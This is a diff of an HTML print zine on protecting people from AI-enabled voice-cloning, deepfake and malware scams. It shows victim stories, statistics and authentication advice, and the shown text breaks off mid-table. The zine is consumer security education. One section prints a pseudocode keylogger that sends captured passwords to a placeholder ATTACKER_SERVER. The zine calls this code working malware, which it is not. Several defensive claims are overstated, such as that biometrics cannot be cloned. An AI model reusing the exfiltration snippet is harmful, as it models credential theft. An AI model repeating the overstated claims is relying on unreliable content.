@@ -1,567 +1,655 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>How to Not Get Hacked by AGI - Print Zine</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>How to Not Get Hacked by AGI</title>
+  <style>
+    @page {
+      size: letter;
+      margin: 0.75in;
+    }
 
-        @page {
-            size: Letter;
-            margin: 0.5in;
-        }
+    @media print {
+      html, body {
+        -webkit-print-color-adjust: exact;
+        print-color-adjust: exact;
+      }
+    }
 
-        @media print {
-            @page {
-                margin: 0.5in;
-                size: Letter;
-            }
-            
-            body {
-                -webkit-print-color-adjust: exact;
-                print-color-adjust: exact;
-            }
-            
-            .page {
-                page-break-after: always;
-                page-break-inside: avoid;
-            }
-        }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
 
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-            background: white;
-            color: #000;
-            line-height: 1.6;
-            font-size: 11pt;
-        }
+    body {
+      font-family: Georgia, 'Times New Roman', serif;
+      font-size: 11pt;
+      line-height: 1.5;
+      color: #000;
+      background: #fff;
+    }
 
-        .page {
-            width: 7.5in;
-            min-height: 10in;
-            padding: 0.75in;
-            page-break-after: always;
-            background: white;
-        }
+    .cover {
+      page-break-after: always;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 2in;
+    }
 
-        .cover-page {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-            background: white;
-        }
+    .cover-title {
+      font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
+      font-size: 36pt;
+      font-weight: 700;
+      letter-spacing: -0.02em;
+      margin-bottom: 0.5in;
+      line-height: 1.1;
+    }
 
-        .cover-title {
-            font-size: 2.5rem;
-            font-weight: 700;
-            color: #000;
-            text-transform: uppercase;
-            letter-spacing: 0.15em;
-            margin-bottom: 2rem;
-            line-height: 1.2;
-        }
+    .cover-subtitle {
+      font-size: 14pt;
+      color: #666;
+      font-style: italic;
+    }
 
-        .cover-subtitle {
-            font-size: 1.25rem;
-            color: #666;
-            font-weight: 400;
-            max-width: 500px;
-        }
+    .section {
+      margin-bottom: 0.4in;
+    }
 
-        h1 {
-            font-size: 1.75rem;
-            font-weight: 600;
-            color: #000;
-            margin-bottom: 1rem;
-            letter-spacing: -0.02em;
-        }
+    .section-title {
+      font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
+      font-size: 18pt;
+      font-weight: 700;
+      margin-bottom: 0.15in;
+      letter-spacing: -0.01em;
+    }
 
-        h2 {
-            font-size: 1.5rem;
-            font-weight: 600;
-            color: #000;
-            margin-bottom: 0.75rem;
-            letter-spacing: -0.01em;
-        }
+    .section-intro {
+      font-size: 11pt;
+      margin-bottom: 0.2in;
+      color: #333;
+    }
 
-        h3 {
-            font-size: 1.25rem;
-            font-weight: 600;
-            color: #000;
-            margin-bottom: 0.5rem;
-        }
+    .story-box {
+      border: 1pt solid #000;
+      padding: 0.2in;
+      margin-bottom: 0.25in;
+      page-break-inside: avoid;
+    }
 
-        p {
-            margin-bottom: 1rem;
-            color: #1d1d1f;
-            line-height: 1.6;
-        }
+    .story-amount {
+      font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
+      font-size: 24pt;
+      font-weight: 700;
+      margin-bottom: 0.05in;
+    }
 
-        .intro-section {
-            margin-bottom: 2rem;
-        }
+    .story-victim {
+      font-weight: 700;
+      margin-bottom: 0.05in;
+    }
 
-        .intro-title {
-            font-size: 2rem;
-            margin-bottom: 1rem;
-        }
+    .story-location {
+      font-size: 10pt;
+      color: #666;
+      margin-bottom: 0.1in;
+    }
 
-        .story-box {
-            border: 2px solid #000;
-            padding: 1.5rem;
-            margin-bottom: 1.5rem;
-        }
+    .story-text {
+      font-size: 10pt;
+      line-height: 1.4;
+    }
 
-        .story-amount {
-            font-size: 2.5rem;
-            font-weight: 700;
-            color: #000;
-            margin-bottom: 0.5rem;
-        }
+    .stats-grid {
+      display: flex;
+      justify-content: space-between;
+      margin: 0.3in 0;
+      page-break-inside: avoid;
+    }
 
-        .story-victim {
-            font-size: 1.25rem;
-            font-weight: 600;
-            margin-bottom: 0.25rem;
-        }
+    .stat-box {
+      text-align: center;
+      flex: 1;
+    }
 
-        .story-meta {
-            font-size: 0.875rem;
-            color: #666;
-            margin-bottom: 1rem;
-        }
+    .stat-number {
+      font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
+      font-size: 28pt;
+      font-weight: 700;
+    }
 
-        .story-text {
-            font-size: 1rem;
-            line-height: 1.6;
-        }
+    .stat-label {
+      font-size: 9pt;
+      color: #666;
+    }
 
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 1.5rem;
-            margin: 2rem 0;
-        }
+    .comparison-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 0.2in 0;
+      font-size: 10pt;
+      page-break-inside: avoid;
+    }
 
-        .stat-box {
-            text-align: center;
-            border: 1px solid #e5e5e5;
-            padding: 1rem;
-        }
+    .comparison-table th,
+    .comparison-table td {
+      border: 1pt solid #ccc;
+      padding: 0.1in;
+      text-align: left;
+    }
 
-        .stat-number {
-            font-size: 2rem;
-            font-weight: 700;
-            color: #000;
-            margin-bottom: 0.25rem;
-        }
+    .comparison-table th {
+      background: #f5f5f5;
+      font-weight: 700;
+      font-size: 9pt;
+      text-transform: uppercase;
+      letter-spacing: 0.02em;
+    }
 
-        .stat-label {
-            font-size: 0.875rem;
-            color: #666;
-        }
+    .vulnerable { color: #c00; }
+    .protected { color: #080; }
 
-        .timeline-item {
-            margin-bottom: 2rem;
-            padding-left: 2rem;
-            border-left: 3px solid #000;
-        }
+    .code-block {
+      font-family: 'SF Mono', Monaco, Consolas, monospace;
+      font-size: 9pt;
+      background: #1d1d1f;
+      color: #e5e5e5;
+      padding: 0.2in;
+      margin: 0.2in 0;
+      border-radius: 4pt;
+      page-break-inside: avoid;
+    }
 
-        .timeline-year {
-            font-size: 0.875rem;
-            font-weight: 600;
-            color: #666;
-            text-transform: uppercase;
-            margin-bottom: 0.25rem;
-        }
+    .code-block .keyword { color: #ff7b72; }
+    .code-block .string { color: #a5d6ff; }
 
-        .timeline-event {
-            font-size: 1.125rem;
-            font-weight: 600;
-            margin-bottom: 0.5rem;
-        }
+    .before-after {
+      display: flex;
+      gap: 0.3in;
+      margin: 0.2in 0;
+      page-break-inside: avoid;
+    }
 
-        .protections-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 1rem;
-            margin: 2rem 0;
-        }
+    .before-after-box {
+      flex: 1;
+      border: 1pt solid #ccc;
+      padding: 0.2in;
+    }
 
-        .protection-card {
-            border: 1px solid #e5e5e5;
-            padding: 1rem;
-        }
+    .before-after-title {
+      font-weight: 700;
+      font-size: 12pt;
+      margin-bottom: 0.1in;
+    }
 
-        .protection-number {
-            font-size: 2rem;
-            font-weight: 700;
-            color: #000;
-            margin-bottom: 0.5rem;
-        }
+    .before-after-stat { margin-bottom: 0.1in; }
 
-        .protection-title {
-            font-size: 1rem;
-            font-weight: 600;
-            margin-bottom: 0.5rem;
-        }
+    .before-after-label {
+      font-size: 8pt;
+      color: #666;
+      text-transform: uppercase;
+      letter-spacing: 0.02em;
+    }
 
-        .protection-body {
-            font-size: 0.9375rem;
-            margin-bottom: 0.5rem;
-        }
+    .before-after-value { font-weight: 700; }
+    .before-after-value.danger { color: #c00; }
 
-        .protection-reason {
-            font-size: 0.875rem;
-            color: #666;
-            font-style: italic;
-        }
+    .protection-list { margin: 0.2in 0; }
 
-        .auth-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 1rem;
-            margin: 2rem 0;
-        }
+    .protection-item {
+      margin-bottom: 0.25in;
+      page-break-inside: avoid;
+    }
 
-        .auth-card {
-            border: 2px solid #000;
-            padding: 1rem;
-            text-align: center;
-        }
+    .protection-number {
+      font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
+      font-size: 18pt;
+      font-weight: 700;
+      float: left;
+      width: 0.5in;
+    }
 
-        .auth-era {
-            font-size: 0.75rem;
-            color: #666;
-            text-transform: uppercase;
-            margin-bottom: 0.5rem;
-        }
+    .protection-content { margin-left: 0.5in; }
 
-        .auth-factor {
-            font-size: 1.5rem;
-            font-weight: 700;
-            margin-bottom: 0.75rem;
-        }
+    .protection-title {
+      font-weight: 700;
+      font-size: 12pt;
+      margin-bottom: 0.05in;
+    }
 
-        .factor-list {
-            font-size: 0.875rem;
-            line-height: 1.6;
-        }
+    .protection-body {
+      font-size: 11pt;
+      margin-bottom: 0.05in;
+    }
 
-        .emphasis-section {
-            border: 2px solid #000;
-            padding: 1.5rem;
-            margin: 2rem 0;
-        }
+    .protection-reason {
+      font-size: 10pt;
+      color: #666;
+      font-style: italic;
+    }
 
-        .emphasis-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 1rem;
-            margin-top: 1rem;
-        }
+    .timeline { margin: 0.2in 0; }
 
-        .emphasis-item {
-            text-align: center;
-        }
+    .timeline-item {
+      display: flex;
+      margin-bottom: 0.15in;
+      page-break-inside: avoid;
+    }
 
-        .footer {
-            text-align: center;
-            margin-top: 2rem;
-            padding-top: 2rem;
-            border-top: 2px solid #000;
-        }
+    .timeline-year {
+      font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
+      font-weight: 700;
+      width: 0.6in;
+      flex-shrink: 0;
+    }
 
-        @media print {
-            .page {
-                page-break-after: always;
-                page-break-inside: avoid;
-            }
-            
-            body {
-                -webkit-print-color-adjust: exact;
-                print-color-adjust: exact;
-            }
-        }
-    </style>
+    .timeline-content { flex: 1; }
+    .timeline-event { font-weight: 700; margin-bottom: 0.02in; }
+    .timeline-description { font-size: 10pt; color: #333; }
+
+    .factor-row {
+      display: flex;
+      gap: 0.2in;
+      margin: 0.2in 0;
+      page-break-inside: avoid;
+    }
+
+    .factor-box {
+      flex: 1;
+      border: 1pt solid #ccc;
+      padding: 0.15in;
+    }
+
+    .factor-box.highlight { border: 2pt solid #000; }
+
+    .factor-number {
+      font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
+      font-size: 20pt;
+      font-weight: 700;
+      color: #ccc;
+      margin-bottom: 0.1in;
+    }
+
+    .factor-box.highlight .factor-number { color: #000; }
+
+    .factor-type {
+      font-size: 8pt;
+      color: #666;
+      text-transform: uppercase;
+      letter-spacing: 0.02em;
+    }
+
+    .factor-example { font-weight: 700; margin: 0.05in 0; }
+    .factor-note { font-size: 9pt; color: #666; }
+    .factor-note.danger { color: #c00; }
+    .factor-note.safe { color: #080; font-weight: 700; }
+
+    .process-row {
+      display: flex;
+      align-items: center;
+      gap: 0.15in;
+      margin: 0.2in 0;
+      page-break-inside: avoid;
+    }
+
+    .process-step {
+      flex: 1;
+      text-align: center;
+      padding: 0.15in;
+      border: 1pt solid #ccc;
+    }
+
+    .process-step.danger {
+      border-color: #c00;
+      background: #fff5f5;
+    }
+
+    .process-arrow { font-size: 14pt; color: #666; }
+    .process-label { font-weight: 700; margin-bottom: 0.05in; }
+    .process-detail { font-size: 9pt; color: #666; }
+
+    .page-break { page-break-before: always; }
+
+    .footer {
+      margin-top: 0.5in;
+      padding-top: 0.3in;
+      border-top: 1pt solid #ccc;
+      text-align: center;
+    }
+
+    .footer-main {
+      font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
+      font-weight: 700;
+      font-size: 18pt;
+      color: #000;
+      margin-bottom: 0.15in;
+    }
+
+    .footer-sub {
+      font-size: 14pt;
+      color: #333;
+    }
+
+    .two-col {
+      display: flex;
+      gap: 0.3in;
+    }
+
+    .two-col > * { flex: 1; }
+  </style>
 </head>
 <body>
-    <!-- Cover Page -->
-    <div class="page cover-page">
-        <h1 class="cover-title">HOW TO NOT GET HACKED BY AGI</h1>
-        <p class="cover-subtitle">Real people. Real losses. Real protection.</p>
+
+  <!-- COVER PAGE -->
+  <div class="cover">
+    <h1 class="cover-title">How to Not Get<br>Hacked by AGI</h1>
+    <p class="cover-subtitle">A guide to protecting yourself in the age of AI-powered attacks</p>
+  </div>
+
+  <!-- PAGE 2: INTRO + STORIES -->
+  <div class="section">
+    <h2 class="section-title">AI changed hacking forever.</h2>
+    <p class="section-intro">
+      Complex hacking attacks used to need expert hackers. Years of training. Deep technical skills. 
+      Now AI can hack on its own. Anyone with AI can find security weaknesses and use them. 
+      It's easy to get started. The danger changed completely.
+    </p>
+    <p class="section-intro">
+      These are real people. Real families. Real losses. These stories happened. They're happening now.
+    </p>
+  </div>
+
+  <div class="two-col">
+    <div class="story-box">
+      <div class="story-amount">$8,200</div>
+      <div class="story-victim">Maureen</div>
+      <div class="story-location">San Diego</div>
+      <div class="story-text">
+        The phone rang. Maureen answered. "Grandma, I'm in jail. I need $8,200 for bail." 
+        The voice was her grandson's. Every inflection. Every pause. She nearly wired the money. 
+        Then she called his real number. He was fine. The voice had been AI. Cloned from 15 seconds of Instagram.
+      </div>
     </div>
 
-    <!-- Page 1: Intro -->
-    <div class="page">
-        <div class="intro-section">
-            <h2 class="intro-title">AI-powered hacking changed everything.</h2>
-            <p>
-                Sophisticated cyberattacks used to require elite hackers. Years of training. Deep technical knowledge.
-                Now AI can independently execute complex attacks. Anyone with AI access can exploit vulnerabilities.
-                The barrier to entry collapsed. The threat landscape fundamentally shifted.
-            </p>
-            <p>
-                These are real people. Real families. Real losses. AI can clone voices. Create deepfakes.
-                Hack autonomously. These stories happened. They're happening now.
-            </p>
-        </div>
+    <div class="story-box">
+      <div class="story-amount">$25.6M</div>
+      <div class="story-victim">Arup (Engineering Firm)</div>
+      <div class="story-location">Hong Kong</div>
+      <div class="story-text">
+        February 2024. A finance worker received a video call. The CFO appeared on screen. 
+        The voice sounded right. The face looked real. The CFO asked for a secret transaction. 
+        $25.6 million was transferred. The video call was fake. AI made it. The CFO never made that call.
+      </div>
+    </div>
+  </div>
 
-        <div class="story-box">
-            <div class="story-amount">$8,200</div>
-            <div class="story-victim">Maureen</div>
-            <div class="story-meta">San Diego</div>
-            <div class="story-text">
-                The phone rang. Maureen answered. "Grandma, I'm in jail. I need $8,200 for bail." The voice was her grandson's. Every inflection. Every pause. She nearly wired the money. Then she called his real number. He was fine. The voice had been AI. Cloned from 15 seconds of Instagram.
-            </div>
-        </div>
+  <div class="two-col">
+    <div class="story-box">
+      <div class="story-amount">$690,000</div>
+      <div class="story-victim">Steve Beauchamp, 82</div>
+      <div class="story-location">United States</div>
+      <div class="story-text">
+        Steve watched a video of Elon Musk explaining an investment. The voice sounded real. 
+        The face looked real. Over several weeks Steve transferred $690,000. His entire retirement fund. 
+        Every penny went to scammers. The video was fake. AI made it. Musk never said any of it.
+      </div>
     </div>
 
-    <!-- Page 2: More Stories -->
-    <div class="page">
-        <div class="story-box">
-            <div class="story-amount">$25.6M</div>
-            <div class="story-victim">Arup</div>
-            <div class="story-meta">Hong Kong</div>
-            <div class="story-text">
-                February 2024. A finance worker received a video call. The CFO appeared on screen. The voice was familiar. The face looked real. The CFO asked for a secret transaction. $25.6 million was transferred. The video call was a deepfake. The CFO never made that call.
-            </div>
-        </div>
-
-        <div class="story-box">
-            <div class="story-amount">$690,000</div>
-            <div class="story-victim">Steve Beauchamp, 82</div>
-            <div class="story-meta">United States</div>
-            <div class="story-text">
-                Steve watched a video of Elon Musk explaining an investment. The voice was clear. The face looked real. Over several weeks Steve transferred $690,000. His entire retirement fund. Every penny went to scammers. The video was a deepfake. Musk never said any of it.
-            </div>
-        </div>
+    <div class="story-box">
+      <div class="story-amount">$15,000</div>
+      <div class="story-victim">Sharon Brightwell</div>
+      <div class="story-location">Florida</div>
+      <div class="story-text">
+        Sharon's phone rang. Her daughter was crying. "Mom, I've been in an accident. I lost the baby. 
+        I need help right now." Sharon sent $15,000 cash to a courier. Later she called her daughter's 
+        real number. Her daughter answered. She was fine. The crying voice had been AI. Cloned from 3 seconds of Facebook video.
+      </div>
     </div>
+  </div>
 
-    <!-- Page 3: Stats & Timeline -->
-    <div class="page">
-        <h2>How we got here</h2>
-        
-        <div class="timeline-item">
-            <div class="timeline-year">2020</div>
-            <div class="timeline-event">Traditional phishing</div>
-            <p>Obvious scams. Bad grammar. Generic greetings. 12% success rate.</p>
-        </div>
-
-        <div class="timeline-item">
-            <div class="timeline-year">2022</div>
-            <div class="timeline-event">AI tools emerge</div>
-            <p>WormGPT and FraudGPT appear on dark web. $200/month for AI phishing.</p>
-        </div>
-
-        <div class="timeline-item">
-            <div class="timeline-year">2023</div>
-            <div class="timeline-event">Voice cloning accessible</div>
-            <p>Commercial tools cost $1/month. 3 seconds of audio needed. 85% accuracy.</p>
-        </div>
-
-        <div class="timeline-item">
-            <div class="timeline-year">2024</div>
-            <div class="timeline-event">Deepfake video calls</div>
-            <p>Arup loses $25.6M. Entire video calls faked. Voice + face cloning combined.</p>
-        </div>
-
-        <div class="timeline-item">
-            <div class="timeline-year">2025</div>
-            <div class="timeline-event">Autonomous AI hacking</div>
-            <p>AI hacks without humans. Discovers vulnerabilities. Executes attacks. 90% autonomous.</p>
-        </div>
-
-        <div class="stats-grid">
-            <div class="stat-box">
-                <div class="stat-number">442%</div>
-                <div class="stat-label">increase in vishing attacks in 2024</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-number">$40B</div>
-                <div class="stat-label">projected loss to deepfake scams by 2027</div>
-            </div>
-            <div class="stat-box">
-                <div class="stat-number">$1/month</div>
-                <div class="stat-label">cost of commercial voice cloning tools</div>
-            </div>
-        </div>
+  <div class="stats-grid">
+    <div class="stat-box">
+      <div class="stat-number">442%</div>
+      <div class="stat-label">increase in phone scams in 2024</div>
     </div>
-
-    <!-- Page 4: Authentication Evolution -->
-    <div class="page">
-        <h2>The evolution of authentication</h2>
-
-        <div class="auth-grid">
-            <div class="auth-card">
-                <div class="auth-era">Pre-Internet</div>
-                <div class="auth-factor">1 Factor</div>
-                <div class="factor-list">
-                    <strong>Something you know</strong><br>
-                    Password
-                </div>
-            </div>
-
-            <div class="auth-card">
-                <div class="auth-era">Post-Internet</div>
-                <div class="auth-factor">2 Factor</div>
-                <div class="factor-list">
-                    <strong>Something you know</strong><br>
-                    Password<br><br>
-                    <strong>Something you have</strong><br>
-                    Smartphone
-                </div>
-            </div>
-
-            <div class="auth-card">
-                <div class="auth-era">Post-AI</div>
-                <div class="auth-factor">3 Factor</div>
-                <div class="factor-list">
-                    <strong>Something you know</strong><br>
-                    Password<br><br>
-                    <strong>Something you have</strong><br>
-                    Smartphone<br><br>
-                    <strong>Something you are</strong><br>
-                    Fingerprint / Face ID
-                </div>
-            </div>
-        </div>
-
-        <p>
-            <strong>Why three factors?</strong> AI can clone voices. AI can intercept SMS codes. AI can trick phone verification.
-            But AI cannot clone your fingerprint. AI cannot replicate your face. This is the final layer that stops AI attacks.
-        </p>
+    <div class="stat-box">
+      <div class="stat-number">$40B</div>
+      <div class="stat-label">projected loss to fake video scams by 2027</div>
     </div>
-
-    <!-- Page 5: How Voice Cloning Works -->
-    <div class="page">
-        <h2>How voice cloning attacks work</h2>
-
-        <div class="story-box">
-            <h3>1. Scrape your voice</h3>
-            <p>AI finds 3 seconds of your voice from Instagram, Facebook, TikTok, or any public video. Every video you post publicly is training data. AI doesn't need much.</p>
-        </div>
-
-        <div class="story-box">
-            <h3>2. Train the model</h3>
-            <p>Commercial tools process your audio. Takes minutes. Costs $1/month. The AI learns your voice patterns, inflections, pauses. Everything that makes your voice yours.</p>
-        </div>
-
-        <div class="story-box">
-            <h3>3. Generate fake audio</h3>
-            <p>AI can now say anything in your voice. "I need money." "I'm in trouble." "Verify your account." The cloned voice sounds real. Your family can't tell the difference. Neither can banks.</p>
-        </div>
-
-        <div class="story-box">
-            <h3>4. Execute the attack</h3>
-            <p>Scammer calls your grandma. Calls your bank. Calls your boss. Uses your cloned voice. They ask for money. They ask for account access. They ask for passwords. It works.</p>
-        </div>
+    <div class="stat-box">
+      <div class="stat-number">$1/mo</div>
+      <div class="stat-label">cost to clone someone's voice</div>
     </div>
+  </div>
 
-    <!-- Page 6: Protections -->
-    <div class="page">
-        <h2>How to protect yourself</h2>
-        <p>
-            AI can clone voices. It can bypass phone verification. It can trick authenticator apps.
-            But AI cannot clone what you physically are or hold. Physical authentication is your strongest defense.
-        </p>
+  <!-- PAGE 3: HOW MALWARE CREATION CHANGED -->
+  <div class="page-break"></div>
+  <div class="section">
+    <h2 class="section-title">Creating malware is now easy.</h2>
+    <p class="section-intro">
+      Before AI: Months of coding. Years of training. Expert hackers only.
+      Now: Ask AI. Get code. Deploy. Anyone can do it.
+    </p>
+  </div>
 
-        <div class="protections-grid">
-            <div class="protection-card">
-                <div class="protection-number">1</div>
-                <h3 class="protection-title">Get a physical security key.</h3>
-                <p class="protection-body">YubiKey. Titan Security Key. These small devices plug into your computer or phone. They cannot be cloned. AI cannot replicate what you physically hold.</p>
-                <p class="protection-reason">Physical keys are the strongest protection. AI cannot clone hardware.</p>
-            </div>
-
-            <div class="protection-card">
-                <div class="protection-number">2</div>
-                <h3 class="protection-title">Use biometric authentication everywhere.</h3>
-                <p class="protection-body">Face ID. Fingerprint. Touch ID. Enable biometric login on your phone, computer, and apps. Your face and fingerprint cannot be cloned by AI.</p>
-                <p class="protection-reason">Biometrics are physical. AI can clone voices but not your face or fingerprint.</p>
-            </div>
-
-            <div class="protection-card">
-                <div class="protection-number">3</div>
-                <h3 class="protection-title">Enable three-factor authentication.</h3>
-                <p class="protection-body">Something you know (password) + something you have (smartphone) + something you are (fingerprint or face ID). This combination stops AI attacks completely.</p>
-                <p class="protection-reason">Three factors: something you know + something you have + something you are. AI cannot clone your fingerprint or face.</p>
-            </div>
-
-            <div class="protection-card">
-                <div class="protection-number">4</div>
-                <h3 class="protection-title">Use authenticator apps with biometrics.</h3>
-                <p class="protection-body">Google Authenticator. Authy. 1Password. Enable two-factor authentication everywhere. Use Face ID or fingerprint when possible. Never use SMS codes.</p>
-                <p class="protection-reason">Authenticator apps with biometrics are stronger than SMS. AI can intercept phone calls but not your biometric.</p>
-            </div>
-
-            <div class="protection-card">
-                <div class="protection-number">5</div>
-                <h3 class="protection-title">Pick a family code word.</h3>
-                <p class="protection-body">Choose a random phrase. Tell your family: if anyone calls asking for money, they must say this code word first.</p>
-                <p class="protection-reason">AI can clone voices. It cannot know your secret.</p>
-            </div>
-
-            <div class="protection-card">
-                <div class="protection-number">6</div>
-                <h3 class="protection-title">Hang up and call back.</h3>
-                <p class="protection-body">If anyone calls with an emergency, hang up. Call them back using a number you have saved. Do not use any number they provide.</p>
-                <p class="protection-reason">Real emergencies can wait 2 minutes for verification.</p>
-            </div>
-        </div>
+  <div class="before-after">
+    <div class="before-after-box">
+      <div class="before-after-title">Before AI</div>
+      <div class="before-after-stat">
+        <div class="before-after-label">Time required</div>
+        <div class="before-after-value">6-12 months</div>
+      </div>
+      <div class="before-after-stat">
+        <div class="before-after-label">Skills needed</div>
+        <div class="before-after-value">Expert programming</div>
+      </div>
+      <div class="before-after-stat">
+        <div class="before-after-label">People capable</div>
+        <div class="before-after-value">~10,000 worldwide</div>
+      </div>
     </div>
-
-    <!-- Page 7: More Protections & Emphasis -->
-    <div class="page">
-        <div class="protections-grid">
-            <div class="protection-card">
-                <div class="protection-number">7</div>
-                <h3 class="protection-title">Lock down social media voices.</h3>
-                <p class="protection-body">Make your videos private. Remove voice samples from public posts. Scammers need 3 seconds of audio.</p>
-                <p class="protection-reason">Less public audio means harder to clone.</p>
-            </div>
-
-            <div class="protection-card">
-                <div class="protection-number">8</div>
-                <h3 class="protection-title">Talk to your parents today.</h3>
-                <p class="protection-body">Sit down with them. Explain voice cloning. Show them examples. Set up biometric authentication and the family code word together.</p>
-                <p class="protection-reason">Elderly people lost $1 billion to AI scams in 2024.</p>
-            </div>
-        </div>
-
-        <div class="emphasis-section">
-            <h2>Physical authentication stops AI</h2>
-            <div class="emphasis-grid">
-                <div class="emphasis-item">
-                    <h3>Physical Security Keys</h3>
-                    <p>YubiKey. Titan Security Key. You plug them in. AI cannot clone hardware.</p>
-                </div>
-                <div class="emphasis-item">
-                    <h3>Biometric Authentication</h3>
-                    <p>Face ID. Fingerprint. Touch ID. AI cannot clone your face or fingerprint.</p>
-                </div>
-                <div class="emphasis-item">
-                    <h3>Three-Factor Authentication</h3>
-                    <p>Password. Smartphone. Fingerprint or face ID. Three layers. AI stops here.</p>
-                </div>
-            </div>
-        </div>
+    <div class="before-after-box">
+      <div class="before-after-title">After AI</div>
+      <div class="before-after-stat">
+        <div class="before-after-label">Time required</div>
+        <div class="before-after-value danger">30 seconds</div>
+      </div>
+      <div class="before-after-stat">
+        <div class="before-after-label">Skills needed</div>
+        <div class="before-after-value danger">None</div>
+      </div>
+      <div class="before-after-stat">
+        <div class="before-after-label">People capable</div>
+        <div class="before-after-value danger">Anyone with internet</div>
+      </div>
     </div>
+  </div>
 
-    <!-- Page 8: Footer -->
-    <div class="page">
-        <div class="footer">
-            <h2>The threat is real. The time is now.</h2>
-            <p>Start with the family code word. Do it today.</p>
-        </div>
+  <p style="margin-bottom: 0.15in;"><strong>Example prompt:</strong> <em>"Write a keylogger that captures passwords and sends them to a server"</em></p>
+
+  <div class="code-block">
+<span class="keyword">import</span> keylogger
+<span class="keyword">import</span> network
+
+<span class="keyword">def</span> steal_credentials():
+    keys = keylogger.capture()
+    passwords = extract_passwords(keys)
+    network.send(passwords, ATTACKER_SERVER)
+
+<span class="keyword">def</span> main():
+    <span class="keyword">while</span> <span class="keyword">True</span>:
+        steal_credentials()
+        time.sleep(<span class="string">60</span>)
+  </div>
+
+  <p style="margin-top: 0.15in;">
+    <strong>Result:</strong> Working malware. Ready to deploy. Created in 30 seconds.
+  </p>
+
+  <div class="section" style="margin-top: 0.4in;">
+    <h2 class="section-title">How voice cloning works</h2>
+    <p class="section-intro">
+      Three seconds of audio. $1 per month. Your voice cloned. Then it attacks.
+    </p>
+  </div>
+
+  <div class="process-row">
+    <div class="process-step">
+      <div class="process-label">3 seconds</div>
+      <div class="process-detail">of audio from Instagram, TikTok, Facebook</div>
     </div>
+    <div class="process-arrow">→</div>
+    <div class="process-step">
+      <div class="process-label">AI processes</div>
+      <div class="process-detail">$1/month, takes minutes</div>
+    </div>
+    <div class="process-arrow">→</div>
+    <div class="process-step">
+      <div class="process-label">Cloned voice</div>
+      <div class="process-detail">can say anything</div>
+    </div>
+    <div class="process-arrow">→</div>
+    <div class="process-step danger">
+      <div class="process-label">Attack</div>
+      <div class="process-detail">calls your family, your bank</div>
+    </div>
+  </div>
+
+  <div class="section" style="margin-top: 0.4in;">
+    <h2 class="section-title">Timeline: How we got here</h2>
+  </div>
+
+  <div class="timeline">
+    <div class="timeline-item">
+      <div class="timeline-year">2020</div>
+      <div class="timeline-content">
+        <div class="timeline-event">Traditional phishing</div>
+        <div class="timeline-description">Obvious scams. Bad grammar. Generic greetings. 12% success rate.</div>
+      </div>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-year">2022</div>
+      <div class="timeline-content">
+        <div class="timeline-event">AI tools emerge</div>
+        <div class="timeline-description">WormGPT and FraudGPT appear on dark web. $200/month for AI phishing.</div>
+      </div>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-year">2023</div>
+      <div class="timeline-content">
+        <div class="timeline-event">Voice cloning accessible</div>
+        <div class="timeline-description">Commercial tools cost $1/month. 3 seconds of audio needed. 85% accuracy.</div>
+      </div>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-year">2024</div>
+      <div class="timeline-content">
+        <div class="timeline-event">Fake video calls</div>
+        <div class="timeline-description">Arup loses $25.6M. Entire video calls faked. Voice + face cloning combined.</div>
+      </div>
+    </div>
+    <div class="timeline-item">
+      <div class="timeline-year">2025</div>
+      <div class="timeline-content">
+        <div class="timeline-event">AI hacks on its own</div>
+        <div class="timeline-description">AI hacks without humans. Finds security weaknesses. Uses them to attack. 90% done by AI.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- PAGE 4: THREE FACTOR AUTH + PROTECTION -->
+  <div class="page-break"></div>
+  <div class="section">
+    <h2 class="section-title">Three factors stop AI attacks</h2>
+    <p class="section-intro">
+      AI can guess passwords. AI can intercept SMS codes. AI can clone voices.
+      AI cannot clone your fingerprint. AI cannot replicate your face.
+    </p>
+  </div>
+
+  <table class="comparison-table">
+    <tr>
+      <th>Attack Method</th>
+      <th>1-Factor (Password)</th>
+      <th>2-Factor (+Phone)</th>
+      <th>3-Factor (+Biometric)</th>
+    </tr>
+    <tr>
+      <td>Password guessing</td>
+      <td class="vulnerable">Vulnerable</td>
+      <td class="protected">Protected</td>
+      <td class="protected">Protected</td>
+    </tr>
+    <tr>
+      <td>SMS interception</td>
+      <td class="vulnerable">Vulnerable</td>
+      <td class="vulnerable">Vulnerable</td>
+      <td class="protected">Protected</td>
+    </tr>
+    <tr>
+      <td>Voice cloning</td>
+      <td class="vulnerable">Vulnerable</td>
+      <td class="vulnerable">Vulnerable</td>
+      <td class="protected">Protected</td>
+    </tr>
+    <tr>
+      <td>Deepfake video calls</td>
+      <td class="vulnerable">Vulnerable</td>
+      <td class="vulnerable">Vulnerable</td>
+      <td class="protected">Protected</td>
+    </tr>
+    <tr>
+      <td>Fingerprint/Face cloning</td>
+      <td class="protected">Protected</td>
